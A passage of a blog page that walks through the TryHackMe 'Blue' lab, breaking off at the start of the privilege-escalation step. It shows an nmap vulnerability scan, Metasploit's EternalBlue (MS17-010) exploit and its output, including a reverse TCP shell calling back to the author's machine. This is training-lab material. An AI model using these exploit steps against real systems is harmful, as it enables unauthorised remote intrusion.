@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Hack into a Windows machine, leveraging common misconfigurations issues. Learn about Metasploit &amp; hash-cracking. Great for beginners. '><title>TryHackMe: Blue Writeup</title>
+
+<link rel='canonical' href='/p/tryhackme-blue-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Blue Writeup'>
+<meta property='og:description' content='Hack into a Windows machine, leveraging common misconfigurations issues. Learn about Metasploit &amp; hash-cracking. Great for beginners. '>
+<meta property='og:url' content='/p/tryhackme-blue-writeup/'>
+<meta property='og:site_name' content='Tanishq Chaudhary'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='windows' /><meta property='article:tag' content='metasploit' /><meta property='article:tag' content='hash-cracking' /><meta property='article:published_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/TqRvxBA.png' />
+<meta name="twitter:title" content="TryHackMe: Blue Writeup">
+<meta name="twitter:description" content="Hack into a Windows machine, leveraging common misconfigurations issues. Learn about Metasploit &amp; hash-cracking. Great for beginners. "><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/TqRvxBA.png' />
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-3DJP1JG0KN', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu8feb5f378a01bc01544f018dbe1cdca8_26024_300x0_resize_q75_box.jpeg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="/">Tanishq Chaudhary</a></h1>
+        <h2 class="site-description">Undergrad Researcher at LTRC, IIIT-H. I like Pen-Testing &amp; NLP.</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/categories/thm'>
+                
+                    <?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="552.000000pt" height="564.000000pt" viewBox="0 0 552.000000 564.000000"
+ preserveAspectRatio="xMidYMid meet">
+
+<g transform="translate(0.000000,564.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M2280 5630 c-345 -48 -646 -195 -885 -435 -126 -126 -204 -230 -280
+-377 -52 -99 -134 -321 -135 -363 -1 -35 -14 -44 -91 -59 -231 -44 -420 -147
+-583 -316 -131 -136 -210 -272 -260 -444 -110 -380 4 -796 293 -1069 131 -123
+296 -215 478 -265 l98 -27 905 -3 c849 -2 907 -1 940 15 104 53 108 192 7 267
+-28 21 -35 21 -935 26 l-907 5 -88 31 c-205 74 -358 209 -451 399 -46 93 -66
+170 -73 285 -22 360 213 680 574 782 110 31 286 31 396 0 81 -23 162 -60 243
+-112 80 -50 172 -34 221 39 29 43 31 113 3 158 -49 81 -222 167 -457 229 -9 2
+-8 16 3 56 121 413 449 731 871 845 91 25 113 27 298 27 185 0 207 -2 298 -27
+450 -121 794 -479 892 -927 13 -58 13 -66 -2 -75 -8 -5 -44 -28 -79 -50 -35
+-23 -72 -51 -80 -64 -39 -55 -34 -142 9 -189 62 -67 140 -68 240 -3 215 140
+505 156 742 42 210 -102 354 -275 418 -504 28 -98 57 -139 114 -158 71 -23
+153 15 184 87 24 54 21 85 -23 219 -95 292 -323 537 -609 656 -144 59 -208 70
+-416 76 l-192 5 -12 52 c-6 28 -27 96 -46 150 -177 510 -603 883 -1138 996
+-114 24 -378 35 -485 20z"/>
+<path d="M3605 3136 c-45 -19 -92 -79 -110 -138 -20 -68 -20 -257 0 -325 32
+-107 101 -163 200 -163 140 1 204 87 213 285 8 180 -34 296 -121 336 -49 22
+-138 24 -182 5z m109 -96 c49 -18 61 -61 61 -210 0 -118 -3 -139 -21 -170 -17
+-30 -25 -35 -58 -35 -31 0 -43 6 -60 28 -19 26 -21 42 -21 170 0 172 10 204
+72 226 1 1 13 -3 27 -9z"/>
+<path d="M5120 3128 c-35 -18 -51 -35 -72 -78 -66 -133 -56 -381 19 -471 55
+-66 166 -88 249 -50 75 34 112 113 121 258 10 158 -28 281 -104 333 -53 36
+-151 40 -213 8z m147 -100 c26 -21 38 -85 38 -203 -1 -138 -16 -190 -59 -201
+-36 -9 -69 1 -84 26 -33 54 -33 306 -1 359 24 38 72 46 106 19z"/>
+<path d="M3104 3069 c-49 -39 -93 -74 -98 -79 -9 -9 40 -80 56 -80 6 0 32 18
+58 40 26 22 49 40 51 40 2 0 2 -106 0 -235 l-3 -235 71 0 71 0 0 310 0 310
+-59 0 c-58 0 -60 -1 -147 -71z"/>
+<path d="M4639 3074 c-123 -96 -117 -87 -85 -128 15 -20 31 -36 36 -36 4 0 32
+20 62 44 l53 43 -3 -238 -3 -239 66 0 65 0 0 310 0 310 -53 0 c-51 0 -58 -3
+-138 -66z"/>
+<path d="M4625 2196 c-90 -25 -135 -101 -150 -256 -9 -83 9 -206 37 -266 41
+-88 134 -129 239 -104 64 16 111 60 135 132 26 72 26 291 1 357 -46 119 -142
+169 -262 137z m97 -107 c28 -15 47 -66 54 -147 14 -153 -18 -263 -80 -270 -62
+-7 -88 53 -88 206 0 122 13 185 45 207 25 18 41 19 69 4z"/>
+<path d="M3101 2120 c-55 -44 -101 -83 -101 -86 0 -8 54 -74 62 -74 3 0 30 20
+60 44 l53 43 -4 -238 -3 -239 71 0 71 0 -2 313 -3 312 -51 3 c-51 3 -53 2
+-153 -78z"/>
+<path d="M3601 2120 c-56 -44 -101 -83 -101 -88 0 -4 13 -23 29 -42 l29 -34
+59 45 58 46 -3 -238 -3 -239 65 0 66 0 0 315 0 315 -49 0 c-47 0 -55 -4 -150
+-80z"/>
+<path d="M4125 2142 c-39 -31 -84 -68 -102 -82 l-32 -25 34 -40 33 -39 59 46
+58 45 -3 -238 -3 -239 66 0 65 0 0 315 0 315 -52 -1 c-49 0 -58 -5 -123 -57z"/>
+<path d="M4974 1356 c-71 -32 -98 -104 -92 -246 3 -73 8 -104 24 -130 58 -101
+196 -108 255 -14 21 34 24 53 27 154 3 104 1 119 -20 159 -13 25 -35 53 -49
+64 -34 25 -105 31 -145 13z m103 -93 c14 -21 18 -48 18 -128 0 -80 -4 -107
+-18 -128 -22 -34 -61 -36 -81 -4 -36 54 -27 254 12 277 29 16 51 11 69 -17z"/>
+<path d="M3073 1353 c-40 -8 -81 -59 -94 -117 -17 -77 -8 -214 17 -257 32 -55
+80 -82 137 -76 102 9 141 71 141 222 0 113 -21 180 -68 210 -27 18 -94 27
+-133 18z m92 -103 c10 -20 15 -58 15 -119 0 -129 -17 -162 -75 -147 -33 8 -48
+68 -43 173 3 62 9 88 23 103 27 30 62 26 80 -10z"/>
+<path d="M3769 1345 c-23 -10 -44 -31 -60 -58 -22 -38 -24 -54 -24 -157 0
+-130 13 -166 76 -208 27 -19 43 -23 82 -19 102 9 141 71 142 222 0 155 -40
+223 -138 231 -24 2 -57 -3 -78 -11z m108 -95 c8 -15 13 -64 13 -120 0 -56 -5
+-105 -13 -120 -17 -33 -57 -38 -83 -9 -16 18 -19 36 -19 129 0 93 3 111 19
+129 26 29 66 24 83 -9z"/>
+<path d="M5328 1304 c-38 -30 -68 -58 -68 -62 1 -4 9 -17 20 -30 21 -26 39
+-21 74 17 11 12 22 21 25 21 4 0 5 -76 3 -170 l-4 -170 51 0 51 0 0 225 0 225
+-42 0 c-37 0 -52 -8 -110 -56z"/>
+<path d="M3407 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 53 13 l39 31 0
+-166 0 -166 50 0 50 0 0 220 0 220 -42 0 c-37 0 -52 -8 -111 -56z"/>
+<path d="M4117 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 52 12 21 17 39
+30 41 30 2 0 3 -74 1 -165 l-3 -165 50 0 51 0 0 220 0 220 -42 0 c-37 0 -52
+-8 -111 -56z"/>
+<path d="M4561 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 155 -208 100 0
+148 75 147 231 -1 92 -23 158 -65 194 -25 20 -41 25 -89 25 -48 0 -64 -5 -89
+-25z m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27
+-72 0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9
+36 -21z"/>
+<path d="M4942 795 c-40 -31 -72 -59 -72 -63 0 -4 9 -18 19 -32 l20 -25 40 33
+41 33 0 -171 0 -171 48 3 47 3 0 220 0 220 -36 3 c-30 3 -46 -5 -107 -53z"/>
+<path d="M5271 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 157 -208 48 0
+57 3 91 38 32 32 39 47 50 110 20 119 -5 229 -62 277 -43 36 -133 36 -177 0z
+m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
+0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9 36
+-21z"/>
+<path d="M3019 715 c-69 -37 -81 -224 -19 -287 52 -51 146 -32 169 34 19 54
+14 178 -9 216 -31 50 -89 65 -141 37z m79 -58 c18 -21 25 -109 13 -154 -14
+-50 -39 -63 -63 -33 -20 25 -25 130 -8 174 10 28 40 35 58 13z"/>
+<path d="M3280 684 c-53 -42 -54 -43 -35 -68 15 -19 15 -19 38 2 13 12 26 22
+30 22 4 0 7 -54 7 -121 l0 -120 33 3 32 3 3 158 3 157 -33 0 c-23 0 -47 -11
+-78 -36z"/>
+<path d="M3913 320 c-35 -14 -55 -55 -61 -125 -5 -73 11 -145 38 -170 10 -9
+37 -19 59 -22 80 -11 121 45 121 164 0 127 -65 190 -157 153z m77 -65 c14 -17
+18 -136 6 -172 -9 -29 -35 -37 -57 -17 -15 14 -19 32 -19 91 0 41 5 83 10 94
+13 23 43 25 60 4z"/>
+<path d="M4167 284 c-52 -40 -52 -41 -33 -67 13 -17 15 -16 45 9 l31 26 0
+-126 0 -126 30 0 30 0 0 160 0 160 -28 0 c-18 0 -47 -14 -75 -36z"/>
+</g>
+</svg>
+
+                
+                <span>TryHackMe Writeups</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/'>
+                
+                    <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="500.536px" height="500.536px" viewBox="0 0 500.536 500.536" style="enable-background:new 0 0 500.536 500.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M410.614,323.309L186.108,98.815c-2.444-2.444-5.754-3.818-9.212-3.818H94.702c-5.925-7.524-13.878-13.97-23.241-18.613
+		c-22.529-11.198-47.907-9.351-61.738,4.465c-2.554,2.556-4.661,5.473-6.239,8.674c-5.11,10.272-4.581,22.481,1.472,34.362
+		c5.834,11.464,16.178,21.311,29.143,27.745c5.816,2.887,11.818,4.888,17.765,6.064v62.329c0.006,3.458,1.38,6.78,3.824,9.218
+		l224.494,224.499c5.095,5.096,13.34,5.096,18.436,0L410.62,341.738C415.703,336.655,415.703,328.403,410.614,323.309z
+		 M55.688,98.815c-2.438,2.438-3.818,5.763-3.818,9.212v40.802c-4.648-1.067-9.327-2.713-13.905-4.983
+		c-11.298-5.609-20.28-14.097-25.263-23.909c-4.776-9.369-5.284-18.799-1.434-26.545c1.162-2.355,2.705-4.51,4.604-6.393
+		c11.222-11.222,32.492-12.383,51.725-2.831c5.861,2.905,11.065,6.591,15.448,10.829H64.905
+		C61.445,94.988,58.132,96.365,55.688,98.815z M84.364,127.497c3.487-3.49,7.826-5.627,12.354-6.428
+		c0.399,4.82-0.375,9.425-2.415,13.547c-1.162,2.355-2.71,4.51-4.61,6.398c-3.18,3.183-7.19,5.523-11.724,7.075
+		C76.635,140.85,78.76,133.098,84.364,127.497z M117.139,160.272c-9.049,9.049-23.726,9.049-32.775,0
+		c-1.271-1.271-2.353-2.657-3.257-4.125c5.654-1.969,10.702-4.947,14.738-8.984c2.557-2.554,4.661-5.471,6.242-8.671
+		c2.657-5.353,3.76-11.225,3.378-17.295c4.28,0.883,8.364,2.979,11.68,6.301C126.188,136.546,126.188,151.217,117.139,160.272z
+		 M496.717,315.631L384.725,427.628c-5.095,5.089-13.352,5.089-18.441,0l-5.674-5.675l69.83-69.841
+		c4.899-4.889,7.589-11.391,7.589-18.3c0-6.91-2.684-13.412-7.583-18.294L205.957,91.013c-4.903-4.891-11.399-7.578-18.291-7.578
+		h-49.694v-1.519c0-3.455,1.38-6.773,3.827-9.218c2.444-2.441,5.748-3.818,9.206-3.818h18.146
+		c-4.389-4.232-9.599-7.923-15.447-10.829c-19.24-9.552-40.51-8.39-51.731,2.832c-1.894,1.882-3.431,4.037-4.613,6.393
+		c-0.556,1.138-0.999,2.311-1.374,3.517c-2.474-1.581-5.003-3.083-7.654-4.412c0.381-0.999,0.762-2.004,1.241-2.974
+		c1.596-3.194,3.691-6.111,6.25-8.674c13.819-13.816,39.215-15.658,61.738-4.466c9.357,4.643,17.315,11.089,23.235,18.613h82.198
+		c3.446,0,6.768,1.377,9.215,3.818l224.496,224.497C501.812,302.29,501.812,310.548,496.717,315.631z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/tryhackme-blue-writeup/">
+                
+                    <img src="https://i.imgur.com/TqRvxBA.png" loading="lazy" alt="Featured image of post TryHackMe: Blue Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: #2a9d8f; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/tryhackme-blue-writeup/">TryHackMe: Blue Writeup</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Hack into a Windows machine, leveraging common misconfigurations issues. Learn about Metasploit &amp; hash-cracking. Great for beginners. 
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Jun 15, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <h2 id="1-recon">1. Recon</h2>
+<p>Reconnaissance</p>
+<h3 id="scan-the-machine-if-you-are-unsure-how-to-tackle-this-i-recommend-checking-out-the-nmap-room">Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)</h3>
+<p><code>❯ nmap --script=vuln -sV -A 10.10.233.113</code></p>
+<pre><code>Nmap scan report for 10.10.233.113
+Host is up (0.43s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+| rdp-vuln-ms12-020: 
+|   VULNERABLE:
+|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2012-0152
+|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
+|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
+|           
+|     Disclosure date: 2012-03-13
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
+|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
+|   
+|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2012-0002
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
+|           
+|     Disclosure date: 2012-03-13
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
+|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+|_sslv2-drown: 
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49160/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 161.25 seconds
+</code></pre><h3 id="how-many-ports-are-open-with-a-port-number-under-1000">How many ports are open with a port number under 1000?</h3>
+<p><code>3</code></p>
+<h3 id="what-is-this-machine-vulnerable-to-answer-in-the-form-of-ms--ex-ms08-067">What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</h3>
+<p><code>ms17-010</code></p>
+<hr>
+<h2 id="2-gain-access">2. Gain Access</h2>
+<h3 id="start-metasploit">Start metasploit</h3>
+<p><code>done</code></p>
+<h3 id="find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code-ex-exploit">Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/&hellip;&hellip;..)</h3>
+<pre><code>msf6 &gt; search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce
+</code></pre><p><code>exploit/windows/smb/ms17_010_eternalblue</code></p>
+<h3 id="show-options-and-set-the-one-required-value-what-is-the-name-of-this-value-all-caps-for-submission">Show options and set the one required value. What is the name of this value? (All caps for submission)</h3>
+<pre><code>msf6 &gt; use 2
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+</code></pre><pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set MY_IP
+RHOSTS =&gt; MY_IP
+</code></pre><p>RHOSTS</p>
+<h3 id="usually-it-would-be-fine-to-run-this-exploit-as-is-however-for-the-sake-of-learning-you-should-do-one-more-thing-before-exploiting-the-target-enter-the-following-command-and-press-enter">Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:</h3>
+<p><code>set payload windows/x64/shell/reverse_tcp</code></p>
+<h3 id="with-that-done-run-the-exploit">With that done, run the exploit!</h3>
+<pre><code>
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit
+
+[*] Started reverse TCP handler on 10.2.60.96:4444 
+[*] 10.10.233.113:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.233.113:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.233.113:445     - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.233.113:445 - Connecting to target for exploitation.
+[+] 10.10.233.113:445 - Connection established for exploitation.
+[+] 10.10.233.113:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.233.113:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.233.113:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.233.113:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.233.113:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.233.113:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.233.113:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.233.113:445 - Sending all but last fragment of exploit packet
+[*] 10.10.233.113:445 - Starting non-paged pool grooming
+[+] 10.10.233.113:445 - Sending SMBv2 buffers
+[+] 10.10.233.113:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.233.113:445 - Sending final SMBv2 buffers.
+[*] 10.10.233.113:445 - Sending last fragment of exploit packet!
+[*] 10.10.233.113:445 - Receiving response from exploit packet
+[+] 10.10.233.113:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.233.113:445 - Sending egg to corrupted connection.
+[*] 10.10.233.113:445 - Triggering free of corrupted buffer.
+[*] Sending stage (336 bytes) to 10.10.233.113
+[*] Command shell session 1 opened (10.2.60.96:4444 -&gt; 10.10.233.113:49214) at 2021-02-01 23:22:21 -0500
+[+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</code></pre><h3 id="confirm-that-the-exploit-has-run-correctly-you-may-have-to-press-enter-for-the-dos-shell-to-appear-background-this-shell-ctrl--z-if-this-failed-you-may-have-to-reboot-the-target-vm-try-running-it-again-before-a-reboot-of-the-target">Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.</h3>
+<p><code>done</code></p>
+<hr>
+<h2 id="3-escalate">3. Escalate</h2>
+<h3 id="if-you-havent-already-background-the-previously-gained-shell-ctrl--z-research-online-how-to-convert-a-shell-to-meterpreter-shell-in-metasploit-what-is-the-name-of-the-post-module-we-will-use-exact-path-similar-to-the-exploit-we-previously-selected">If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</h3>
+<pre><code>
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; search shell_to_meterpreter
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
